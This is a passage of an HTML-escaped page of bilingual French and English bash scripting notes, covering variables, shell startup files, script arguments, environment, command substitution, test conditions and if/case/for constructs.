&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;nom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[index]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# variables typées&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# entier&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ma_var
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;res &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ma_var + 5 &lt;span class=&quot;nv&quot;&gt;res2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a+b
&lt;span class=&quot;c&quot;&gt;# ou ((...))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;le-shell&quot;&gt;le shell&lt;/h3&gt;
&lt;p&gt;connexion&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;shell connexion&lt;/li&gt;
  &lt;li&gt;lance le shell du user dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/profile&lt;/code&gt; (inclu &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/profile.d/*&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~/.bash_profile&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~/.bash_login&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~/.profile&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;déconnexion&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~/.bash_logout&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;shell mode non intéractif (pour les process)
pas de script au démarrage
BASH_ENV: permet d’en éxecuter un&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;pour donner option à bash: man bash
&lt;span class=&quot;c&quot;&gt;# -a&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -u&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -x&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -o vim&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -C&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;iii---shell-program&quot;&gt;III - Shell program&lt;/h1&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# le sha-bang&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# chmod 555 scriptname (gives everyone read/execute permission)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# chmod u+rx scriptname (gives only the script owner read/execute permission)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# A script needs read, as well as execute permission for it to run, since the shell needs to be able to read it.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# file in .sh .ksh .csh&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# executable mode&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x my_script.sh

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./my_script.sh

&lt;span class=&quot;nv&quot;&gt;$ PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;:.
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;my_script.sh

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;my_script.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/bash (+ options)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ; = lign jump&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;iv---arguments&quot;&gt;IV - Arguments&lt;/h1&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# position parameters = speciales variables&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# script name&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# parameters&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;...9

&lt;span class=&quot;c&quot;&gt;# parametres numbers&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$#&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# &quot;$1 $2 $3 ...&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$*&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# &quot;$1&quot; &quot;$2&quot; &quot;$3&quot; ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# $1=var1 $2=var2 $3=var3&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;var1 var2 var3

&lt;span class=&quot;nv&quot;&gt;$ $1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;shift &lt;/span&gt;4

&lt;span class=&quot;c&quot;&gt;# return 0 and quit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1

&lt;span class=&quot;c&quot;&gt;# return value&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;v---process-environnement&quot;&gt;V - Process environnement&lt;/h1&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# only exported values are available in script environnement&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# see environnement&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;env&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# share var without export for every script&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;env &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;val1 &lt;span class=&quot;nv&quot;&gt;var2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;val2 m_script.sh

&lt;span class=&quot;c&quot;&gt;# on bash&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ var1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;val1 &lt;span class=&quot;nv&quot;&gt;var2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;val2 m_script.sh

&lt;span class=&quot;c&quot;&gt;# only standard output is on variable&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# the error output is in screen&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;vi---command-substitution&quot;&gt;VI - Command substitution&lt;/h1&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ my_unix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ machine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f5&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# bash&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$()&lt;/span&gt; replace &lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;vii---conditions&quot;&gt;VII - Conditions&lt;/h1&gt;
&lt;hr /&gt;
&lt;h3 id=&quot;strings-1&quot;&gt;strings&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 0 if $var is empty&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 0 if $var is not empty&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 0 if equals&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;var&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 0 if different&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;var&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# &quot;$a&quot; is better than $a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;numeric&quot;&gt;numeric&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# test val1 option val2&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# options&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -eq : ==&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -ne : !=&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -lt : &amp;lt; (less than)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -gt : &amp;gt; (greater than)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -le : &amp;lt;= (less or equal)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -ge : &amp;gt;= (greater or equal)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;files-1&quot;&gt;files&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# test option file&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# options&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -d&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -c (caracter mode)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -b&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -p&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -r&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -w&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -x&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -s (not empty)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -e (exist)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -L (simlink)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -u (exist + SUID)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -g (exist + GUID)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;combinés&quot;&gt;combinés&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# -a : and&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -o : or&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ! : non&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# \(...\)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rep1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rep1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;vii---better-syntax&quot;&gt;VII - Better syntax&lt;/h1&gt;
&lt;hr /&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# test -&amp;gt; [ ... ]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [[ ... ]] : more rapid, no process, force command interne&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# can use &amp;amp;&amp;amp; (-a) and || (-o)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;ix---shell-program&quot;&gt;IX - Shell program&lt;/h1&gt;
&lt;hr /&gt;
&lt;h3 id=&quot;if&quot;&gt;if&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 2 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;then
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Give 2 args please&quot;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Ex: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 10 20&quot;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
&lt;span class=&quot;k&quot;&gt;fi

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;then
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;values avec equals&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lt&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;then
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; is less than &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$y&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; is bigger or equal to &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$y&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# command&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# C syntax&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;case&quot;&gt;case&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
  &lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;la premiere valeur est 10&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
  2&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;la premiére valeur est 20&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;je ne reconnais pas la valeur&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# *&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ?&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [...]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [!...]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# | : logic or&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Nom: &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;nom
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Prénom: &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;prenom
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Bonjour &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$prenom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; !&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;for&quot;&gt;for&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;elt &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;je suis dans la boucle &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$elt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

for &lt;/span&gt;elt &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;3&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;je suis dans la boucle &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$elt&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; i&amp;lt;10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; i++ &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;je suis dans la boucle &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

for &lt;/span&gt;int &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;100&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
